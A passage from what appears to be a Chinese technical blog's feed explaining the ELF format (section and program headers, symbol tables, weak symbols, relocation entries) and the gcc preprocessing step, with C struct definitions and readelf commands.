Size of section in bytes */</span><br>  Elf64_Word sh_link;<span class="hljs-comment">/* Index of another section */</span><br>  Elf64_Word sh_info;<span class="hljs-comment">/* Additional section information */</span><br>  Elf64_Xword sh_addralign;<span class="hljs-comment">/* Section alignment */</span><br>  Elf64_Xword sh_entsize;<span class="hljs-comment">/* Entry size if section holds table */</span><br>&#125; Elf64_Shdr;<br></code></pre></td></tr></table></figure><h3 id="1-2-1-sh-name"><a href="#1-2-1-sh-name" class="headerlink" title="1.2.1 sh_name"></a>1.2.1 sh_name</h3><p>表示节名在字符串表中的偏移</p><h3 id="1-2-2-sh-type"><a href="#1-2-2-sh-type" class="headerlink" title="1.2.2 sh_type"></a>1.2.2 sh_type</h3><p>表示节的类型，常见的类型枚举如下：</p><ul><li>SHT_NULL: 表示无效节，通常第0号节区为该类型</li><li>SHT_PROGBITS: 表示该section包含由程序决定的内容，如<code>.text</code>、<code>.data</code>、<code>.plt</code>、<code>.got</code></li><li>SHT_SYMTAB&#x2F;SHT_DYNSYM: 表示该section中包含符号表，如<code>.symtab</code>、<code>.dynsym</code></li><li>SHT_DYNAMIC: 表示该section中包含动态链接阶段所需要的信息</li><li>SHT_STRTAB: 表示该section中包含字符串信息，如<code>.strtab</code>、<code>.shstrtab</code></li><li>SHT_REL&#x2F;SHT_RELA: 表示该section中包含重定向项信息</li></ul><h3 id="1-2-3-文件时信息"><a href="#1-2-3-文件时信息" class="headerlink" title="1.2.3 文件时信息"></a>1.2.3 文件时信息</h3><ul><li>sh_offset: 内容起始地址相对于文件开头的偏移</li><li>sh_size: 内容的大小</li><li>sh_entsize: 有的内容是也是一个数组，这个字段就表示数组的元素大小</li></ul><h3 id="1-2-4-装载时信息"><a href="#1-2-4-装载时信息" class="headerlink" title="1.2.4 装载时信息"></a>1.2.4 装载时信息</h3><ul><li>sh_addr: 如果该section需要在运行时加载到虚拟内存中，该字段就是对应section内容(第一个字节)的虚拟地址</li><li>sh_addralign: 内容地址的对齐，如果有的话需要满足<code>sh_addr % sh_addralign = 0</code></li><li>sh_flags: 表示所映射内容的权限，可根据<code>SHF_WRITE/ALLOC/EXECINSTR</code>进行组合</li></ul><h3 id="1-2-5-拓展字段"><a href="#1-2-5-拓展字段" class="headerlink" title="1.2.5 拓展字段"></a>1.2.5 拓展字段</h3><p><code>sh_link</code>和<code>sh_info</code>的含义根据section类型的不同而不同，常用于提供链接信息，如下表所示：</p><p><img src="/2022/11/15/elf-wen-jian-ge-shi/844554_XHZJRQ8CAFEQDJK.png" alt="Section header拓展字段"></p><h2 id="1-3-Program-header-table"><a href="#1-3-Program-header-table" class="headerlink" title="1.3 Program header table"></a>1.3 Program header table</h2><p>一个由 e_phnum个大小为 e_phentsize元素组成的数组，主要用来保存程序加载到内存中所使用的一些信息，使用段 (segment) 来表示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_phdr</span>&#123;</span><br>  Elf32_Wordp_type;<br>  Elf32_Offp_offset;<br>  Elf32_Addrp_vaddr;<br>  Elf32_Addrp_paddr;<br>  Elf32_Wordp_filesz;<br>  Elf32_Wordp_memsz;<br>  Elf32_Wordp_flags;<br>  Elf32_Wordp_align;<br>&#125; Elf32_Phdr;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_phdr</span> &#123;</span><br>  Elf64_Word p_type;<br>  Elf64_Word p_flags;<br>  Elf64_Off p_offset;<span class="hljs-comment">/* Segment file offset */</span><br>  Elf64_Addr p_vaddr;<span class="hljs-comment">/* Segment virtual address */</span><br>  Elf64_Addr p_paddr;<span class="hljs-comment">/* Segment physical address */</span><br>  Elf64_Xword p_filesz;<span class="hljs-comment">/* Segment size in file */</span><br>  Elf64_Xword p_memsz;<span class="hljs-comment">/* Segment size in memory */</span><br>  Elf64_Xword p_align;<span class="hljs-comment">/* Segment alignment, file &amp; memory */</span><br>&#125; Elf64_Phdr;<br></code></pre></td></tr></table></figure><h3 id="1-3-1-p-type"><a href="#1-3-1-p-type" class="headerlink" title="1.3.1 p_type"></a>1.3.1 p_type</h3><p>表示段的类型，常见的类型枚举如下：</p><ul><li>PT_NULL: 表示该段未使用</li><li>PT_LOAD: Loadable Segment，将文件中的segment内容映射到进程内存中对应的地址上。值得一提的是SPEC中说在program header中的多个PT_LOAD地址是按照虚拟地址递增排序的</li><li>PT_DYNAMIC: 动态链接中用到的段，通常是RW映射，因为需要由<code>interpreter</code>(ld.so)修复对应的的入口</li><li>PT_INTERP: 包含interpreter的路径，动态连接时，类似ELF用户态加载器</li><li>PT_HDR: 表示program header table本身。如果有这个segment的话，必须要在所有可加载的segment之前，并且在文件中不能出现超过<strong>一次</strong></li></ul><h3 id="1-3-2-装载信息"><a href="#1-3-2-装载信息" class="headerlink" title="1.3.2 装载信息"></a>1.3.2 装载信息</h3><ul><li>p_offset: 该segment的数据在文件中的偏移地址(相对文件头)</li><li>p_vaddr: segment数据应该加载到进程的虚拟地址</li><li>p_paddr: segment数据应该加载到进程的物理地址(如果对应系统使用的是物理地址)</li><li>p_filesz: 该segment数据在文件中的大小</li><li>p_memsz: 该segment数据在进程内存中的大小。注意需要满足<code>p_memsz&gt;=p_filesz</code>，多出的部分初始化为0，通常作为<code>.bss</code>段内容</li><li>p_flags: 进程中该segment的权限(R&#x2F;W&#x2F;X)</li><li>p_align: 该segment数据的对齐，2的整数次幂。即要求<code>p_offset % p_align = p_vaddr</code>。</li></ul><h1 id="2-符号"><a href="#2-符号" class="headerlink" title="2.符号"></a>2.符号</h1><p>链接的本质就是寻找目标文件之间对函数和变量地址的引用并修复正确，其中函数和变量叫做符号（Symbol）。整个链接过程是基于符号的，每一个目标文件都会有一个相应的符号表（Symbol Table）。</p><h2 id="2-1-符号表"><a href="#2-1-符号表" class="headerlink" title="2.1 符号表"></a>2.1 符号表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_sym</span>&#123;</span><br>  Elf32_Wordst_name;<br>  Elf32_Addrst_value;<br>  Elf32_Wordst_size;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<br>  Elf32_Halfst_shndx;<br>&#125; Elf32_Sym;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_sym</span> &#123;</span><br>  Elf64_Word st_name;<span class="hljs-comment">/* Symbol name, index in string tbl */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Type and binding attributes */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* No defined meaning, 0 */</span><br>  Elf64_Half st_shndx;<span class="hljs-comment">/* Associated section index */</span><br>  Elf64_Addr st_value;<span class="hljs-comment">/* Value of the symbol */</span><br>  Elf64_Xword st_size;<span class="hljs-comment">/* Associated symbol size */</span><br>&#125; Elf64_Sym;<br></code></pre></td></tr></table></figure><h3 id="2-1-1-st-name"><a href="#2-1-1-st-name" class="headerlink" title="2.1.1 st_name"></a>2.1.1 st_name</h3><p>表示符号名在字符串表中的索引</p><h3 id="2-1-2-st-info"><a href="#2-1-2-st-info" class="headerlink" title="2.1.2 st_info"></a>2.1.2 st_info</h3><p><strong>低4位标识符号类型</strong>（Symbol Type），<strong>高4位表示符号绑定信息</strong>（Symbol Binding）。</p><p>符号绑定表：</p><table><thead><tr><th>名称</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STB_LOCAL</td><td>0</td><td>局部符号，目标文件外部不可见</td></tr><tr><td>STB_GLOBA</td><td>1</td><td>全局符号，目标文件外部可见</td></tr><tr><td>STB_WEAK</td><td>2</td><td>弱引用</td></tr><tr><td>STB_LOOS</td><td>10</td><td></td></tr><tr><td>STB_HIOS</td><td>12</td><td></td></tr><tr><td>STB_LOPROC</td><td>13</td><td></td></tr><tr><td>STB_HIPROC</td><td>15</td><td></td></tr></tbody></table><p>符号类型表：</p><table><thead><tr><th>名称</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>STT_NOTYPE</td><td>0</td><td>未知类型</td></tr><tr><td>STT_OBJECT</td><td>1</td><td>表示数据对象，如变量、数组等</td></tr><tr><td>STT_FUNC</td><td>2</td><td>表示函数或其他可执行代码</td></tr><tr><td>STT_SECTION</td><td>3</td><td>表示一个Section，必选是局部符号</td></tr><tr><td>STT_FILE</td><td>4</td><td>表示文件名，常表示源文件名，必选是局部符号，st_shndx为SHN_ABS</td></tr><tr><td>STT_COMMON</td><td>5</td><td></td></tr><tr><td>STT_TLS</td><td>6</td><td></td></tr><tr><td>STT_LOOS</td><td>10</td><td></td></tr><tr><td>STT_HIOS</td><td>12</td><td></td></tr><tr><td>STT_LOPROC</td><td>13</td><td></td></tr><tr><td>STT_SPARC_REGISTER</td><td>13</td><td></td></tr><tr><td>STT_HIPROC</td><td>15</td><td></td></tr></tbody></table><h3 id="2-1-3-st-value"><a href="#2-1-3-st-value" class="headerlink" title="2.1.3 st_value"></a>2.1.3 st_value</h3><p>如果该符号通常是函数或变量，这个值即为地址。具体有如下几种情况：</p><ul><li>目标文件 &amp;&amp; st_shndx !&#x3D; SHN_COMMON，st_value表示该符号在st_shndx指定的Section中的偏移，全局变量最常见情况</li><li>目标文件 &amp;&amp; st_shndx &#x3D;&#x3D; SHN_COMMON，st_value表示该符号的对齐属性</li><li>可执行文件，st_value表示符号的虚拟地址</li></ul><h3 id="2-1-4-st-size"><a href="#2-1-4-st-size" class="headerlink" title="2.1.4 st_size"></a>2.1.4 st_size</h3><p>符号大小（Byte），跟符号类型有关系，如double占8个字节</p><h3 id="2-1-5-st-shndx"><a href="#2-1-5-st-shndx" class="headerlink" title="2.1.5 st_shndx"></a>2.1.5 st_shndx</h3><p><strong>如果符号定义在本目标文件中，该值表示这个符号所在的段在段表中的索引。</strong>如果符号不再本目标文件中，或者对于一些特殊符号，shndx可能取下表中的值：</p><table><thead><tr><th>名称</th><th>值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_ABS</td><td>0xfff1</td><td>表示该符号包含了一个绝对的值</td></tr><tr><td>SHN_COMMON</td><td>0xfff2</td><td>表示该符号是一个”COMMON”块类型的符号，如未初始化的全局弱符号</td></tr><tr><td>SHN_UNDEF</td><td>0</td><td>表示该符号未定义，这个符号在本目标文件被引用但是定义在其他目标文件中</td></tr></tbody></table><h2 id="2-2-extern关键字"><a href="#2-2-extern关键字" class="headerlink" title="2.2 extern关键字"></a>2.2 extern关键字</h2><h3 id="2-2-1-非常量全局变量的外部链接"><a href="#2-2-1-非常量全局变量的外部链接" class="headerlink" title="2.2.1 非常量全局变量的外部链接"></a>2.2.1 非常量全局变量的外部链接</h3><p>当链接器在一个全局变量声明前看到extern关键字，它会尝试在其他文件中寻找这个变量的定义</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// a.cpp</span><br><span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<span class="hljs-comment">// 声明并定义i</span><br><br><span class="hljs-comment">// b.cpp</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> i;<span class="hljs-comment">// 正确，声明i链接外部全局变量</span><br><br><span class="hljs-comment">// c.pp</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;<span class="hljs-comment">// 错误，全局变量i重定义</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2-常量全局变量的外部链接"><a href="#2-2-2-常量全局变量的外部链接" class="headerlink" title="2.2.2 常量全局变量的外部链接"></a>2.2.2 常量全局变量的外部链接</h3><p>常量全局变量默认是内部链接的，所以想要在文件间传递常量全局变量需要在定义时指明extern</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// a.cpp</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;        <span class="hljs-comment">// 定义</span><br><br><span class="hljs-comment">// b.cpp                    </span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">int</span> i;   <span class="hljs-comment">// 声明</span><br></code></pre></td></tr></table></figure><h3 id="2-2-3-extern-“C”符号声明"><a href="#2-2-3-extern-“C”符号声明" class="headerlink" title="2.2.3 extern “C”符号声明"></a>2.2.3 extern “C”符号声明</h3><p>在C++中，当与字符串连用时，extern指明当前声明使用了其他语言的链接规范，如extern “C”，就指明使用C语言的链接规范。C++语言在编译的时候为了解决函数的多态问题，会将函数名和参数联合起来生成一个唯一的函数签名（名字粉碎），而C语言不会，因此在C++中声明C编译的符号时会出现无法找到符号的问题，此时就需要用extern “C”进行链接指定。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 声明printf函数使用C链接</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)</span></span>;<br><br><span class="hljs-comment">//声明指定的头文件内所有的东西都使用 C 链接</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>&#125;<br><br><span class="hljs-comment">// 声明全局变量 errno 为C链接</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-type">int</span> errno;<br><br><span class="hljs-comment">//  定义函数 ShowChar 使用 C 链接</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">char</span> <span class="hljs-title">ShowChar</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span> </span>&#123;<br>    <span class="hljs-built_in">putchar</span>(ch);<br>    <span class="hljs-keyword">return</span> ch;<br>&#125;<br><br><span class="hljs-comment">// C++常见的预编译写法</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus  </span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span>  </span><br>  <br><span class="hljs-comment">/**** some declaration or so *****/</span>  <br>  <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus  </span><br>&#125;  <br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="2-3-弱符号与强符号"><a href="#2-3-弱符号与强符号" class="headerlink" title="2.3 弱符号与强符号"></a>2.3 弱符号与强符号</h2><p>在C&#x2F;C++中，编译器默认函数和初始化的全局变量为强符号，未初始化的全局变量为弱符号。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> waek;<span class="hljs-comment">// 弱符号</span><br><span class="hljs-type">int</span> strong = <span class="hljs-number">1</span>;<span class="hljs-comment">// 强符号</span><br>__attribute__((weak)) waek2 = <span class="hljs-number">2</span>;<span class="hljs-comment">// 指定弱符号</span><br></code></pre></td></tr></table></figure><p>针对强弱符号的概念，链接器会按照如下规则处理与选择被多次定义的全局符号：</p><ul><li>不允许强符号被多次定义（不同文件定义相同），发生重定义链接错误</li><li>如果一个符号在某个目标文件中是强符号，在其他文件中都是弱符号，那么最终强符号有效</li><li>如果一个符号在所有目标文件中都是弱符号，那么选择其中占用空间最大的一个</li></ul><p>可以用来重载函数，测试实例如下：</p><p><img src="/2022/11/15/elf-wen-jian-ge-shi/image-20221117111939956.png" alt="强弱符号测试"></p><p><a href="https://gcc.gnu.org/onlinedocs/gcc/Common-Function-Attributes.html#Common-Function-Attributes">Common Function Attributes (Using the GNU Compiler Collection (GCC))</a></p><h2 id="2-4-弱引用与强引用"><a href="#2-4-弱引用与强引用" class="headerlink" title="2.4 弱引用与强引用"></a>2.4 弱引用与强引用</h2><p>在C&#x2F;C++中，链接阶段需要对目标文件引用的外部符号进行决议，如果没有找到该符号的定义，会报符号为定义链接错误，这种被称为强引用。弱引用与其相反，在没有找到该符号时，并不会产生错误，而是获得默认0值或特殊值，以便程序能够识别。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">// 强引用</span><br><br><span class="hljs-type">static</span> __attribute__ ((<span class="hljs-built_in">weakref</span>(<span class="hljs-string">&quot;same_func&quot;</span>))) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">// 弱引用</span><br><span class="hljs-comment">// 其中same_func为func的别名，函数必须指定static，作用域为当前文件</span><br></code></pre></td></tr></table></figure><p>可以实现拓展，如果same_func函数在外部定义了，就执行外部定义的；如果未定义，就不执行这个功能，如下图所示：</p><p><img src="/2022/11/15/elf-wen-jian-ge-shi/image-20221117113416156.png" alt="弱引用与强引用测试"></p><h1 id="3-重定位"><a href="#3-重定位" class="headerlink" title="3.重定位"></a>3.重定位</h1><p>链接器在处理目标文件时，需要对目标文件中的某些位置进行重定位，即将符号指向恰当的位置，确保程序正常执行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_rel</span> &#123;</span><br>  Elf32_Addrr_offset;<br>  Elf32_Wordr_info;<br>&#125; Elf32_Rel;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_rel</span> &#123;</span><br>  Elf64_Addr r_offset;<span class="hljs-comment">/* Location at which to apply the action */</span><br>  Elf64_Xword r_info;<span class="hljs-comment">/* index and type of relocation */</span><br>&#125; Elf64_Rel;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf32_rela</span>&#123;</span><br>  Elf32_Addrr_offset;<br>  Elf32_Wordr_info;<br>  Elf32_Swordr_addend;<br>&#125; Elf32_Rela;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">elf64_rela</span> &#123;</span><br>  Elf64_Addr r_offset;<span class="hljs-comment">/* Location at which to apply the action */</span><br>  Elf64_Xword r_info;<span class="hljs-comment">/* index and type of relocation */</span><br>  Elf64_Sxword r_addend;<span class="hljs-comment">/* Constant addend used to compute value */</span><br>&#125; Elf64_Rela;<br></code></pre></td></tr></table></figure><p><strong>一般来说，32 位程序只使用 Elf32_Rel，64 位程序只使用 Elf32_Rela。</strong></p><h3 id="3-1-1-r-offset"><a href="#3-1-1-r-offset" class="headerlink" title="3.1.1 r_offset"></a>3.1.1 r_offset</h3><p><strong>此成员给出了需要重定位的位置。</strong>对于一个可重定位文件而言，此值是从需要重定位的符号所在节区头部开始到将被重定位的位置之间的字节偏移。对于可执行文件或者共享目标文件而言，其取值是需要重定位的<strong>虚拟地址</strong>，一般而言，也就是说我们所说的 GOT 表的地址。</p><h3 id="3-1-2-r-info"><a href="#3-1-2-r-info" class="headerlink" title="3.1.2 r_info"></a>3.1.2 r_info</h3><p><strong>此成员给出需要重定位的符号的符号表索引，以及相应的重定位类型。</strong>根据符号来获取外部地址，重定位类型决定修复方式，比如对e8 call的修复和全局变量的修复方式存在差异。</p><p>位运算表示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(info)             ((info)&gt;&gt;8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(info)            ((unsigned char)(info))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_INFO(sym, type)       (((sym)&lt;&lt;8)+(unsigned char)(type))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_SYM(info)             ((info)&gt;&gt;32)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_TYPE(info)            ((Elf64_Word)(info))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF64_R_INFO(sym, type)       (((Elf64_Xword)(sym)&lt;&lt;32) + (Elf64_Xword)(type))</span><br></code></pre></td></tr></table></figure><p>常用类型枚举如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* x86-64 relocation types */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_NONE       0   <span class="hljs-comment">/* No reloc */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_64         1   <span class="hljs-comment">/* Direct 64 bit  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_PC32       2   <span class="hljs-comment">/* PC relative 32 bit signed */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_GOT32      3   <span class="hljs-comment">/* 32 bit GOT entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_PLT32      4   <span class="hljs-comment">/* 32 bit PLT address */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_COPY       5   <span class="hljs-comment">/* Copy symbol at runtime */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_GLOB_DAT   6   <span class="hljs-comment">/* Create GOT entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_JUMP_SLOT  7   <span class="hljs-comment">/* Create PLT entry */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_RELATIVE   8   <span class="hljs-comment">/* Adjust by program base */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_GOTPCREL   9   <span class="hljs-comment">/* 32 bit signed pc relative offset to GOT */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_32         10  <span class="hljs-comment">/* Direct 32 bit zero extended */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_32S        11  <span class="hljs-comment">/* Direct 32 bit sign extended */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_16         12  <span class="hljs-comment">/* Direct 16 bit zero extended */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_PC16       13  <span class="hljs-comment">/* 16 bit sign extended pc relative */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_8          14  <span class="hljs-comment">/* Direct 8 bit sign extended  */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_PC8        15  <span class="hljs-comment">/* 8 bit sign extended pc relative */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> R_X86_64_NUM        16</span><br></code></pre></td></tr></table></figure><h3 id="3-1-2-r-addend"><a href="#3-1-2-r-addend" class="headerlink" title="3.1.2 r_addend"></a>3.1.2 r_addend</h3><p>此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</p><h1 id="Linux查看ELF命令"><a href="#Linux查看ELF命令" class="headerlink" title="Linux查看ELF命令"></a>Linux查看ELF命令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看Section header table</span><br>readelf -S xxx<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看符号表</span><br>readelf -s xxx<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看重定位表</span><br>readelf -r xxx<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> build </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序构建基础</title>
      <link href="/2022/11/14/cheng-xu-gou-jian-ji-chu/"/>
      <url>/2022/11/14/cheng-xu-gou-jian-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="1-gcc背后的操作"><a href="#1-gcc背后的操作" class="headerlink" title="1.gcc背后的操作"></a>1.gcc背后的操作</h1><h2 id="1-1-gcc命令"><a href="#1-1-gcc命令" class="headerlink" title="1.1 gcc命令"></a>1.1 gcc命令</h2><p><strong>用于C&#x2F;C++程序构建，主要完成以下工作：</strong></p><ul><li>预处理Prepressing</li><li>编译        Compilation</li><li>汇编        Assembly</li><li>链接        Linking</li></ul><p><strong>流程图如下：</strong></p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114162951847.png" alt="gcc编译过程分解"></p><h2 id="1-2-预编译"><a href="#1-2-预编译" class="headerlink" title="1.2 预编译"></a>1.2 预编译</h2><p>主要用于处理引入的头文件、宏定义等信息。</p><p><strong>对应的gcc编译语句如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -E hello.c -o hello.i<br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者</span><br>cpp hello.c &gt; hello.i<br></code></pre></td></tr></table></figure><p><strong>处理流程如下：</strong></p><ul><li>展开所有的宏定义，删除所有的 “#define” 指令</li><li>处理所有的条件编译指令，如 “#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理 “#include” 预编译指令，递归使用包含的文件内容填充</li><li>删除所有的注释 “&#x2F;&#x2F;“ 和 “&#x2F;* *&#x2F;“</li><li>添加调试信息，行号和文件名标识</li><li>保留所有的 #pragma 编译器指令</li></ul><p><strong>hello.i：</strong></p><p><img src="/2022/11/14/cheng-xu-gou-jian-ji-chu/image-20221114164941171.png" alt="hello.i文件"></p><h2 id="1-3-编译"><a href="#1-3-编译" class="headerlink" title="1.3 编译"></a>1.3 编译</h2><h3 